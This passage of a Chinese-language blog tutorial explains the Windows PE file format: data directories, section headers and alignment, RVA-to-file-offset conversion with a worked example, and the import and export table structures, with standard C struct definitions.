|</p></li><li><p>DataDirectory：最重要字段之一，它由16个相同的<code>IMAGE_DATA_DIRECTORY</code>结构组成，虽然PE文件中的数据是按照装入内存后的页属性归类而被放在不同的节中的，但是这些处于各个节中的数据按照用途可以被分为导出表、导入表、资源、重定位表等数据块，这16个<code>IMAGE_DATA_DIRECTORY</code>结构就是用来定义多种不同用途的数据块的。<code>IMAGE_DATA_DIRECTORY</code>结构的定义很简单，它仅仅指出了某种数据块的位置和长度。</p><p><code>DataDirectory</code>是<code>OptionalHeader</code>的最后128个字节，也是<code>IMAGE_NT_HEADERS</code>的最后一部分数据。</p></li></ul><h2 id="3-4-IMAGE-DATA-DIRECTORY"><a href="#3-4-IMAGE-DATA-DIRECTORY" class="headerlink" title="3.4 IMAGE_DATA_DIRECTORY"></a>3.4 IMAGE_DATA_DIRECTORY</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;<span class="comment">//数据块的起始RVA</span></span><br><span class="line">    DWORD   Size;<span class="comment">//数据块的长度</span></span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure><p>16个数据目录的含义：</p><img src="/posts/4dec66bb/IMAGE_DATA_DIRECTORY.jpg" class="" title="16个数据目录的含义"><p>在PE文件中寻找特定的数据时就是从这些<code>IMAGE_DATA_DIRECTORY</code>结构开始的，比如要存取资源，那么必须从第3个<code>IMAGE_DATA_DIRECTORY</code>结构（索引为2）中得到资源数据块的大小和位置；同理，如果要查看PE文件导入了哪些DLL文件的哪些API函数，那就必须首先从第2个<code>IMAGE_DATA_DIRECTORY</code>结构得到导入表的位置和大小。</p><h1 id="4-区块表-节表"><a href="#4-区块表-节表" class="headerlink" title="4. 区块表(节表)"></a>4. 区块表(节表)</h1><h2 id="4-1-PE文件到内存的映射"><a href="#4-1-PE文件到内存的映射" class="headerlink" title="4.1 PE文件到内存的映射"></a>4.1 PE文件到内存的映射</h2><p>在执行一个PE文件的时候，Windows并不在一开始就将整个文件读入内存，而是采用与内存映射文件类似的机制。也就是说，Windows装载器在装载的时候仅仅建立好虚拟地址和PE文件之间的映射关系。当且仅当真正执行到某个内存页中的指令或者访问某一页的数据时，这个页面才会被从磁盘提交到物理内存，这种机制使文件装入的速度和文件大小没有太大关系。</p><p>需要注意的是，系统装载可执行文件的方法又不完全等同于内存映射文件。当使用内存映射文件的时候，数据本身和数据之间的相对位置是完全相同的；而在装载可执行文件的时候，有些数据在装入前会被预处理，如重定位等，正因此，装入以后，数据之间的相对位置可能发生微妙的变化。</p><p>Windows装载器装载DOS头部、PE文件头和区块表部分是不进行任何特殊处理的，而在装载区块的时候则会自动按区块的属性做不同的处理。</p><p>一般情况下，它会处理以下几个方面的内容：</p><ul><li><p>内存页的属性：对于磁盘映射文件来说，所有的页都是按照磁盘映射文件函数指定的属性设置的。但是在装载可执行文件时，与节对应的内存页属性要按照节的属性来设置。所以，在同属于一个模块的内存页中，从不同节映射过来的内存页的属性是不同的。</p></li><li><p>区块的偏移地址：节的起始地址在磁盘文件中是按照<code>IMAGE_OPTIONAL_HEADER32</code>结构的<code>FileAlignment</code>字段的值进行对齐的，而当被加载到内存中时是按照同一结构中的<code>SectionAlignment</code>字段的值对齐的，两者的值可能不同，所以一个节被装入内存后相对于文件头的偏移和在磁盘文件中的偏移可能是不同的。</p><p>注意，节事实上就是相同属性数据的组合。当节被装入到内存中的时候，相同一个节所对应的内存页都将被赋予相同的页属性， 事实上，Windows 系统对内存属性的设置是以页为单位进行的，所以节在内存中的对齐单位必须至少是一个页的大小（对于32位操作系统来说，这个值一般是4KB(1000H)；对于64位操作系统这个值一般是8KB(2000H)）。</p><p>节在磁盘中就没有最小4KB的限制，为了减少磁盘文件的大小，文件对齐的单位一般要小于内存对齐的单位(<code>FileAlignment</code>的值一般为200h)，这样，在磁盘中就不必为每个节对齐4KB的大小了。</p></li><li><p>区块的大小：对节的尺寸的处理主要分为两个方面：</p><p>第一个方面，由于磁盘映像和内存映像中节对齐存储单位的不同而导致了长度扩展不同；</p><p>第二个方面，是对于包含未初始化数据的节的处理问题。既然是未初始化，那么没有必要为其在磁盘中浪费空间资源，但在内存中不同，因为程序一运行，之前未初始化的数据便有可能要被赋值初始化，那么就必须为它们留下空间。</p></li><li><p>不进行映射的区块：有些节并不需要被映射到内存中，例如<code>.reloc</code>节，重定位数据对于文件的执行代码来说是透明的，无作用的，它只是提供Windows装载器使用，执行代码根本不会去访问到它们，所以没有必要将它们映射到物理内存中。</p></li></ul><h2 id="4-2-节表"><a href="#4-2-节表" class="headerlink" title="4.2 节表"></a>4.2 节表</h2><p>PE文件中所有节的属性都被定义在节表中，节表由一系列的<code>IMAGE_SECTION_HEADER</code>结构排列而成，每个结构用来描述一个节，结构的排列顺序和它们描述的节在文件中的排列顺序是一致的。全部有效结构的最后以一个空的<code>IMAGE_SECTION_HEADER</code>结构作为结束，所以节表中<code>IMAGE_SECTION_HEADER</code>结构数量等于节的数量加一。节表总是被存放在紧接在PE文件头的地方。</p><p>另外，节表中<code>IMAGE_SECTION_HEADER</code>结构的总数总是由PE文件头 <code>IMAGE_NT_HEADERS</code>结构中的<code>FileHeader.NumberOfSections</code>字段来指定的。</p><h2 id="4-3-IMAGE-SECTION-HEADER"><a href="#4-3-IMAGE-SECTION-HEADER" class="headerlink" title="4.3 IMAGE_SECTION_HEADER"></a>4.3 IMAGE_SECTION_HEADER</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; <span class="comment">//节表名称，如.text</span></span><br><span class="line">    <span class="comment">//IMAGE_SIZEOF_SHORT_NAME=8</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        DWORD PhysicalAddress;<span class="comment">//物理地址</span></span><br><span class="line">        DWORD VirtualSize;<span class="comment">//区块尺寸</span></span><br><span class="line">        <span class="comment">//这两个值是一个联合结构，可以使用其中的任何一个，一般取后者</span></span><br><span class="line">    &#125;Misc;                     </span><br><span class="line">    DWORD VirtualAddress;<span class="comment">//区块的RVA地址</span></span><br><span class="line">    DWORD SizeOfRawData;<span class="comment">//在文件中对齐后的尺寸</span></span><br><span class="line">    DWORD PointerToRawData;<span class="comment">//在文件中偏移</span></span><br><span class="line">    DWORD PointerToRelocations;<span class="comment">//在OBJ文件中使用，重定位的偏移</span></span><br><span class="line">    DWORD PointerToLinenumbers;<span class="comment">//行号表的偏移（供调试使用）</span></span><br><span class="line">    WORD NumberOfRelocations;<span class="comment">//在OBJ文件中使用，重定位项数目</span></span><br><span class="line">    WORD NumberOfLinenumbers;<span class="comment">//行号表中行号的数目</span></span><br><span class="line">    DWORD Characteristics;<span class="comment">//区块属性如可读，可写，可执行等</span></span><br><span class="line">&#125;IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><p>重要字段说明如下：</p><ul><li><p>Name：区块名。这是一个由8位的ASCII码名，用来定义区块的名称。多数区块名都习惯性以一个“.”作为开头（例如：<code>.text</code>），但这个“.” 实际上不是必须的。值得注意的是，如果区块名超过8个字节，则没有最后的终止标志“NULL”字节。并且前边带有一个“$”的区块名字会从链接器那里得到特殊的待遇，前边带有“$”的相同名字的区块在载入时候将会被合并，在合并之后的区块中，它们是按照“$”后边的字符的字母顺序进行合并的。</p><p>每个区块的名称都是唯一的，不能有同名的两个区块。但事实上节的名称不代表任何含义，它的存在仅仅是为了正规统一编程的时候方便程序员查看方便而设置的一个标记而已。所以将包含代码的区块命名为“.Data”或者将包含数据的区块命名为“.Code”都是合法的。</p><p>当我们要从PE文件中读取需要的区块的时候，不能以区块的名称作为定位的标准和依据，正确的方法是按照<code>IMAGE_OPTIONAL_HEADER32</code>结构中的数据目录字段结合进行定位。</p></li><li><p>VirtualSize：对表对应的区块的大小，这是区块的数据在没有进行对齐处理前的实际大小。</p></li><li><p>VirtualAddress：该区块装载到内存中的RVA 地址。这个地址是按照内存页来对齐的，因此它的数值总是<code>SectionAlignment</code>的值的整数倍。</p></li><li><p>SizeOfRawData：该区块在磁盘中所占的大小，这个数值等于<code>VirtualSize</code>字段的值按照<code>FileAlignment</code>的值对齐以后的大小。</p></li><li><p>PointerToRawData：指出节在磁盘文件中所处的位置。这个数值是从文件头开始算起的偏移量。</p></li></ul><p>依靠上面4个字段的值，装载器就可以从PE文件中找出某个节(从<code>PointerToRawData</code>偏移开始的<code>SizeOfRawData</code>字节)的数据，并将它映射到内存中去(映射到从模块基地址偏移<code>VirtualAddress</code>的地方，并占用以<code>VirtualSize</code>的值按照页的尺寸对齐后的空间大小)。</p><ul><li>Characteristics：该区块的属性。该字段是按位来指出区块的属性（如代码/数据/可读/可写等）的标志。可通过链接器的<code>/SECTION</code>选项设置， 下面是比较重要的标志：</li></ul><div class="table-container"><table><thead><tr><th>字段值</th><th>用途</th></tr></thead><tbody><tr><td>IMAGE_SCN_CNT_CODE<br />0x00000020</td><td>包含代码，常与0x10000000一起设置</td></tr><tr><td>IMAGE_SCN_CNT_INITIALIZED_DATA<br />0x00000040</td><td>该块包含已初始化的数据</td></tr><tr><td>IMAGE_SCN_CNT_UNINITIALIZED_DATA<br /> 0x00000080</td><td>该块包含未初始化的数据</td></tr><tr><td>IMAGE_SCN_MEM_DISCARDABLE<br />0x02000000</td><td>该块可被丢弃，一旦加载可被丢弃的块.reloc(重定位块)</td></tr><tr><td>IMAGE_SCN_MEM_SHARED<br />0x10000000</td><td>共享块</td></tr><tr><td>IMAGE_SCN_MEM_EXECUTE<br />0x20000000</td><td>该块可执行，通常与0x00000020标志一起被设置</td></tr><tr><td>IMAGE_SCN_MEM_READ<br />0x40000000</td><td>该块可读</td></tr><tr><td>IMAGE_SCN_MEM_WRITE<br />0x80000000</td><td>该块可写</td></tr></tbody></table></div><h1 id="5-区块-节"><a href="#5-区块-节" class="headerlink" title="5. 区块(节)"></a>5. 区块(节)</h1><p>通常，区块中的数据在逻辑上是关联的。PE 文件一般至少都会有两个区块：一个是代码块，另一个是数据块。每一个区块都需要有一个截然不同的名字，这个名字主要是用来表达区块的用途。例如有一个区块叫<code>.rdata</code>，表明它是一个只读区块。注意：区块在映像中是按起始地址（RVA）来排列的，而不是按字母表顺序。另外，使用区块名字只是人们为了认识和编程的方便，而对操作系统来说这些是无关紧要的。微软给这些区块取了个有特色的名字，但这不是必须的。当编程从PE 文件中读取需要的内容时，如输入表、输出表，不能以区块名字作为参考，正确的方法是按照数据目录表中的字段来进行定位。</p><p>区块名称以及意义： </p><div class="table-container"><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>.text</td><td>默认的区块代码，它的内容全是指令代码</td></tr><tr><td>.data</td><td>默认的读/写数据区块，全局变量、静态变量一般放这</td></tr><tr><td>.rdata</td><td>默认的只读数据区块</td></tr><tr><td>.idata</td><td>包含其他外来DLL的函数及数据信息，即输入表</td></tr><tr><td>.edata</td><td>输出表</td></tr><tr><td>.rsrc</td><td>资源，包含模块的全部资源，如图标、菜单、位图等</td></tr><tr><td>.bss</td><td>未初始化数据</td></tr><tr><td>.tls</td><td>线程局部存储器，包含数据的初始化值，运行时所需要的额外变量</td></tr><tr><td>.reloc</td><td>可执行文件的基址重定位，基址重定位一般仅是DLL文件才需要</td></tr><tr><td>.sdata</td><td>通过全局指针相对寻址的“短”可读/写数据</td></tr><tr><td>.srdata</td><td>通过全局指针相对寻址的“短”只读数据</td></tr><tr><td>.pdata</td><td>异常表</td></tr><tr><td>.debug$S</td><td>OBJ文件中Codeview格式的符号，是一个可变长的Codeview格式符号记录流</td></tr><tr><td>.debug$T</td><td>OBJ文件中Codeview格式的类型记录，是一个可变长的Codeview格式类型记录流</td></tr><tr><td>.debug$P</td><td>使用预编译头时会出现在OBJ文件中</td></tr><tr><td>.drectve</td><td>只用于OBJ文件，包含一些链接器指令</td></tr><tr><td>.didat</td><td>延迟加载的导入数据</td></tr></tbody></table></div><p>在Visual C++中也可以自定义区块名字，用<code>#pragma</code>来声明，告诉编译器插入数据到这个区块内：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;MY_DATA&quot;</span>) </span></span><br></pre></td></tr></table></figure><p>以上语句告诉编译器将数据都放进一个叫“MY_DATA”的区块内，而不是默认的<code>.data</code>区块。区块一般是从OBJ文件开始，被编译器放置的。链接器的工作就是合并左右OBJ和库中需要的块，使其成为一个最终合适的区块。链接器会遵循一套相当完整的规则，它会判断哪些区块被合并以及如何被合并。</p><p>链接器的一个有趣特征就是能够合并区块。如果两个区块有相似、一致的属性(读、写、执行)，那么它们在链接的时候能被合并成一个单一的区块。这取决于是否开启编译器的<code>/merge</code>开关。事实上合并区块有一个好处就是可以节省磁盘的内存空间。</p><p>下面的链接器选项将<code>.rdata</code>与<code>.text</code>区块合并为一个<code>.text</code>区块：<code>/MERGE : .rdata = .text</code></p><p>注意：合并区块时并没有什么硬性规定。例如，把<code>.rdata</code>合并到<code>.text</code>里不会有什么问题，但是不应该将<code>.rsrc</code>、<code>.reloc</code>、<code>.pdata</code>合并到其它的区块里。</p><h2 id="5-1-区块的对齐"><a href="#5-1-区块的对齐" class="headerlink" title="5.1 区块的对齐"></a>5.1 区块的对齐</h2><p>区块大小是要对齐的，有两种对齐值，一种用于磁盘文件内，另一种用于内存中。PE文件头指出了这两个值，它们可以不同。</p><p>PE 文件头里边的<code>FileAligment</code> 定义了磁盘区块的对齐值。每一个区块从对齐值的倍数的偏移位置开始存放。而区块的实际代码或数据的大小不一定刚好是这么多，所以在多余的地方一般以00h来填充，这就是区块间的间隙。例如，在PE文件中，一个典型的对齐值是200h，这样，每个区块都将从200h的倍数的文件偏移位置开始，假设第一个区块在400h处，长度为90h，那么从文件400h到490h为这一区块的内容，而由于文件的对齐值是200h，所以为了使这一区块的长度为<code>FileAlignment</code>的整数倍，491h 到 600h 这一个区间都会被00h 填充，这段空间称为区块间隙，下一个区块的开始地址为600h 。</p><p>PE 文件头里边的<code>SectionAligment</code>定义了内存中区块的对齐值。PE 文件被映射到内存中时，区块总是至少从一个页边界开始。一般在x86 系列的CPU 中，页是按4KB（1000h）来排列的；在IA-64上，是按8KB（2000h）来排列的。所以在x86 系统中，PE文件区块的内存对齐值一般等于1000h，每个区块按1000h的倍数在内存中存放。</p><h2 id="※5-2-RVA到FOA的转换"><a href="#※5-2-RVA到FOA的转换" class="headerlink" title="※5.2 RVA到FOA的转换"></a>※5.2 RVA到FOA的转换</h2><p>RVA是当PE文件被装载到内存中后，某个数据位置相对于文件头的偏移量。如果Windows装载器将一个PE文件装入到00400000h处的内存中，而某个区块中的某个数据被装入0040xxxxh处，那么这个数据的RVA就是(0040xxxxh-00400000h=)xxxxh。反过来说，将RVA的值加上文件被装载的基地址，就可以找到数据在内存中的实际地址。</p><p>RVA使文件装入内存后的数据定位变得方便，然后却给我们要定位位于磁盘上的静态PE文件带来了麻烦。</p><p>当处理PE文件的时候，任何的RVA必须经过到FOA的换算，才能用来定位并访问文件中的数据，但换算却无法用一个简单的公式来完成。事实上，唯一可用的方法就是穷举，步骤如下：</p><ol><li>循环扫描区块表得出每个区块在内存中的起始RVA(<code>IMAGE_SECTION_HEADER</code>的<code>VirtualAddress</code>字段)，并根据区块大小(<code>IMAGE_SECTION_HEADER</code>的<code>SizeOfRawData</code>字段)算出区块的结束RVA(两者相加即可)，最后判断目标RVA是否落在该区块内。</li><li>已知目标RVA在哪个区块后，用目标RVA减去该区块的起始RVA，这样就能得到目标RVA相对于起始RVA的偏移量RVA2。</li><li>在区块表中获取该区块在文件中所处的偏移地址(根据<code>IMAGE_SECTION_HEADER</code>中的<code>PointerToRawData</code>字段)，将这个偏移值加上RVA2得到真正的文件偏移地址(FOA)。</li></ol><img src="/posts/4dec66bb/RVA%E4%B8%8EFOA.png" class="" title="RVA到FOA的转换"><p>举个例子，求目标RVA为0x198000的文件偏移地址。</p><img src="/posts/4dec66bb/5.2.1.png" class="" title="RVA到FOA的转换例子"><p><code>.text</code>结束RVA = 0x1000 + 0x176ade = 0x177ade &lt; 0x198000</p><p><code>.rdata</code>结束RVA = 0x178000 + 0x4d896 = 0x1c5896 &gt; 0x198000</p><p>所以目标RVA在<code>.rdata</code>段。</p><p>目标RVA相对于<code>.rdata</code>起始RVA的偏移 = 0x198000 - 0x178000 = 0x20000</p><p><code>.rdata</code>段在磁盘文件中的偏移地址 = 0x177000</p><p>所以目标RVA在磁盘文件的偏移地址 = 0x177000 + 0x20000 = 0x197000</p><h2 id="5-3-输入表"><a href="#5-3-输入表" class="headerlink" title="5.3 输入表"></a>5.3 输入表</h2><h3 id="5-3-1-输入函数"><a href="#5-3-1-输入函数" class="headerlink" title="5.3.1 输入函数"></a>5.3.1 输入函数</h3><p>在代码分析或编程中经常遇到“输入函数”的概念，输入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于相关的DLL文件中，在调用者程序中只保留相关的函数信息(如函数名、DLL文件名等)即可。对于磁盘上的PE文件来说，它无法得知这些输入函数在内存中的地址，只有当PE文件被装入内存后，Windows加载器才将相关DLL装入，并将调用输入函数的指令和函数实际所处的地址联系起来，这就是“动态链接”的概念。动态链接是通过PE文件中定义的“输入表”来完成的，输入表中保存的正是函数名和其驻留的DLL名等。</p><h3 id="5-3-2-IMAGE-IMPORT-DESCRIPTOR"><a href="#5-3-2-IMAGE-IMPORT-DESCRIPTOR" class="headerlink" title="5.3.2 IMAGE_IMPORT_DESCRIPTOR"></a>5.3.2 IMAGE_IMPORT_DESCRIPTOR</h3><p>PE文件头的<code>IAMGE_OPTIONAL_HEADER</code>结构中的<code>DataDirectory</code>的第二个成员就是指向输入表。而输入表是以一个<code>IMAGE_IMPORT_DESCRIPTOR</code>(简称IID)的数组开始。每个被PE文件链接进来的DLL文件都分别对应一个IID数组结构。在这个IID数组中，并没有指出有多少个链接文件，但它最后是以一个全为0(NULL)的IID作为结束的标志。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span>&#123;</span><span class="comment">//共用体类型，共占同一个地址，分时用</span></span><br><span class="line">        DWORD Characteristics;</span><br><span class="line">DWORD    OriginalFirstThunk;<span class="comment">//指向输入名称表(INT)RVA的结构数组</span></span><br><span class="line">    &#125;;</span><br><span class="line">DWORD     TimeDateStamp;</span><br><span class="line">DWORD     ForwarderChain;</span><br><span class="line">DWORD     Name;<span class="comment">//指向被输入的DLL名称</span></span><br><span class="line">DWORD     FirstThunk;<span class="comment">//指向输入地址表(IAT)RVA，IAT是一个IMAGE_THUNK_DATA结构的数组</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR, *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>重要字段如下：</p><ul><li>OriginalFirstThunk：指向输入名称表(INT)RVA的结构数组，数组类型为<code>IMAGE_THUNK_DATA</code>。</li><li>Name：指向存有DLL名称的相对虚拟地址。</li><li>FirstThunk：指向输入地址表(IAT)RVA的结构数组，数组类型为<code>IMAGE_THUNK_DATA</code>。</li></ul><img src="/posts/4dec66bb/5.3.4.png" class="" title="导入表相互关系"><p><code>FirstThunk</code>指向的<code>IMAGE_THUNK_DATA</code>数组中的<code>Function</code>保存的就是真实内存中的函数地址，<code>OriginalFirstThunk</code>指向的同样是<code>IMAGE_THUNK_DATA</code>数组，但是保存的并不是真实内存中的函数地址，而是<code>IMAGE_IMPORT_BY_NAME</code>数组的RVA，保存的是导入函数的文件名。</p><h3 id="5-3-3-IMAGE-THUNK-DATA32"><a href="#5-3-3-IMAGE-THUNK-DATA32" class="headerlink" title="5.3.3 IMAGE_THUNK_DATA32"></a>5.3.3 IMAGE_THUNK_DATA32</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">       DWORD ForwarderString;<span class="comment">//指向一个转向字符串的RVA</span></span><br><span class="line">       DWORD Function; <span class="comment">//被输入的函数的内存地址</span></span><br><span class="line">       DWORD Ordinal; <span class="comment">//被输入的API的序数值</span></span><br><span class="line">       DWORD AddressOfData;<span class="comment">//指向IMAGE_IMPORT_BY_NAME结构</span></span><br><span class="line">    &#125;u1;</span><br><span class="line">&#125;IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="comment">//IMAGE_THUNK_DATA64与IMAGE_THUNK_DATA32的区别，仅仅是把DWORD换成了64位整数。</span></span><br></pre></td></tr></table></figure><p><code>IMAGE_THUNK_DATA</code>只占一个双字字节，当双字字节的最高位为1时，表示函数以序号方式输入，这时候低31位被看作一个函数序号。当双字字节的最高位为0时，表示函数以字符串类型的函数名方式输入，这时双字的值是一个RVA，指向一个<code>IMAGE_IMPORT_BY_NAME</code>结构。</p><h3 id="5-3-4-IMAGE-IMPORT-BY-NAME"><a href="#5-3-4-IMAGE-IMPORT-BY-NAME" class="headerlink" title="5.3.4 IMAGE_IMPORT_BY_NAME"></a>5.3.4 IMAGE_IMPORT_BY_NAME</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;<span class="comment">//指出函数在所在的dll的输出表中的序号        </span></span><br><span class="line">    BYTE    Name[<span class="number">1</span>];<span class="comment">//指出要输入的函数的函数名</span></span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><p>结构中的<code>Hint</code>字段也表示函数的序号，不过这个字段是可选的，有些编译器总是将它设置为 0，<code>Name</code>字段定义了导入函数的名称字符串，这是一个以 0 为结尾的字符串。</p><h3 id="※5-3-5-输入地址表-IAT"><a href="#※5-3-5-输入地址表-IAT" class="headerlink" title="※5.3.5 输入地址表(IAT)"></a>※5.3.5 输入地址表(IAT)</h3><p>为什么由两个并行的指针数组同时指向<code>IMAGE_IMPORT_BY_NAME</code>结构呢？第一个数组(由<code>OriginalFirstThunk</code>所指向)是单独的一项，而且不能被改写。第二个数组(由<code>FirstThunk</code>所指向)由PE装载器重写，这就是PE装载器的核心操作。</p><p>PE装载器首先搜索<code>OriginalFirstThunk</code>，找到后加载程序迭代搜索数组中的每个指针，找到每个<code>IMAGE_IMPORT_BY_NAME</code>结构所指向的输入函数的地址，然后加载器用函数真正入口地址来代替由<code>FirstThunk</code>数组中的一个入口，因此我们称为输入地址表(IAT)。</p><img src="/posts/4dec66bb/5.3.5.png" class="" title="输入地址表"><p>此时，输入表中其它部分就不重要了，程序依靠IAT提供的函数地址就可以正常运行。</p><p><a href="https://www.bilibili.com/video/BV1us411P7nL?p=9">找到输入表在PE文件中的地址和被加载进内存的地址 空降18:38</a></p><h2 id="5-4-输出表"><a href="#5-4-输出表" class="headerlink" title="5.4 输出表"></a>5.4 输出表</h2><p>当PE文件被执行的时候，Windows加载器将文件装入内存并将导入表登记的动态链接库(一般是DLL格式)文件一并装入地址空间，再根据DLL文件中的函数导出信息，对可执行文件的IAT进行修正。</p><p>动态链接库是被映射到其它应用程序的地址空间中执行的，它和应用程序可以看成是“一体”的，动态链接库可以使用应用程序的资源，它所拥有的资源也可以被应用程序使用，它的任何操作都是代表应用程序进行的，当动态链接库进行打开文件、分配内存和创建窗口等操作后，这些文件、内存和窗口都是为应用程序所拥有的。</p><p>导出表就是记载着动态链接库的一些导出信息。通过导出表，DLL 文件可以向系统提供导出函数的名称、序号和入口地址等信息，比便Windows 加载器通过这些信息来完成动态连接的整个过程。</p><p>注意：扩展名为<code>.exe</code>的PE文件一般不存在导出表，而大部分的<code>.dll</code>文件中都包含导出表。但注意，这并不是绝对。比如纯粹用作资源的<code>.dll</code>文件不需要导出函数，有些特殊功能的<code>.exe</code>文件也会存在导出函数。</p><h3 id="5-4-1-导出表结构"><a href="#5-4-1-导出表结构" class="headerlink" title="5.4.1 导出表结构"></a>5.4.1 导出表结构</h3><p>PE文件头的<code>IAMGE_OPTIONAL_HEADER</code>结构中的<code>DataDirectory</code>的第一个成员就是指向导出表。导出表是用来描述模块中的导出函数的结构，如果一个模块导出了函数，那么这个函数会被记录在导出表中，这样通过<code>GetProcAddress()</code>函数就能动态获取到函数的地址。函数导出的方式有两种，一种是按名字导出，一种是按序号导出。这两种导出方式在导出表中的描述方式也不相同。</p><p>导出表（Export Table）中的主要成分是一个表格，内含函数名称、输出序数等。序数是指定DLL 中某个函数的16位数字，在所指向的DLL 文件中是独一无二的。在此不提倡仅仅通过序数来索引函数的方法，这样会给DLL 文件的维护带来问题。例如当DLL 文件一旦升级或修改就可能导致调用改DLL 的程序无法加载到需要的函数。</p><h3 id="5-4-2-IMAGE-EXPORT-DIRECTORY"><a href="#5-4-2-IMAGE-EXPORT-DIRECTORY" class="headerlink" title="5.4.2 IMAGE_EXPORT_DIRECTORY"></a>5.4.2 IMAGE_EXPORT_DIRECTORY</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;<span class="comment">//未使用，总是定义为0</span></span><br><span class="line">    DWORD   TimeDateStamp;<span class="comment">//文件生成时间</span></span><br><span class="line">    WORD    MajorVersion;<span class="comment">//未使用，总是定义为0</span></span><br><span class="line">    WORD    MinorVersion;<span class="comment">//未使用，总是定义为0</span></span><br><span class="line">    DWORD   Name;<span class="comment">//模块名字</span></span><br><span class="line">    DWORD   Base;<span class="comment">//基数，加上序数就是函数地址数组的索引值</span></span><br><span class="line">    DWORD   NumberOfFunctions;<span class="comment">//所有导出函数的数量</span></span><br><span class="line">    DWORD   NumberOfNames;<span class="comment">//按名字导出函数的数量</span></span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">//指向输出函数地址的RVA</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">//指向输出函数名字的RVA</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">//指向输出函数序号的RVA</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><p>重要字段说明如下：</p><ul><li><p>Name：一个RVA 值，指向一个定义了模块名称的字符串。如即使Kernel32.dll 文件被改名为”Ker.dll”，仍然可以从这个字符串中的值得知其在编译时的文件名是”Kernel32.dll”。</p></li><li><p>NumberOfFunctions：文件中包含的导出函数的总数。</p></li><li><p>NumberOfNames：被定义函数名称的导出函数的总数。显然只有这个数量的函数既可以用函数名方式导出，也可以用序号方式导出。剩下的<code>NumberOfFunctions</code>减去<code>NumberOfNames</code>数量的函数只能用序号方式导出。该字段的值只会小于或者等于<code>NumberOfFunctions</code>字段的值，如果这个值是0，表示所有的函数都是以序号方式导出的。</p></li><li><p>AddressOfFunctions：一个RVA 值，指向包含全部导出函数入口地址的双字数组。数组中的每一项是一个RVA 值，数组的项数等于<code>NumberOfFunctions</code>字段的值。</p></li><li><p>Base：导出函数序号的起始值，将<code>AddressOfFunctions</code>字段指向的入口地址表的索引号加上这个起始值就是对应函数的导出序号。</p><p>假如Base 字段的值为x，那么入口地址表指定的第1个导出函数的序号就是x；第2个导出函数的序号就是x＋1。总之，一个导出函数的导出序号等于Base 字段的值加上其在入口地址表中的位置索引值。</p></li><li><p>AddressOfNames 和 AddressOfNameOrdinals：均为RVA 